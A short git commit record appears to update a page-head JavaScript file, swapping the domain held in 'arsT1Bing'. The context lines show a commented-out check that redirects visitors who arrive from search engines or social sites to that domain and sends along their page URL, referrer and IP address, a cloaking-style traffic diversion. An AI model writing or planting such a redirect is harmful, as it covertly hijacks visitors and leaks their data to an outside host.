1d18d2764514ecf98aecbe430c92bd02accc892f
recognitionissue <tasralasir@gmail.com>
2026-05-17 22:26:10 +0700

    Update t1_head_farhan.js

--- t1_head_farhan.js
+++ t1_head_farhan.js
@@ -1,5 +1,5 @@
 ///// Arsae /////
-var arsT1Bing = 'https://t1.zahiracipiyoh.my.id';
+var arsT1Bing = 'https://farhan.teknodrem.com';
 
 // if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
 	// window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
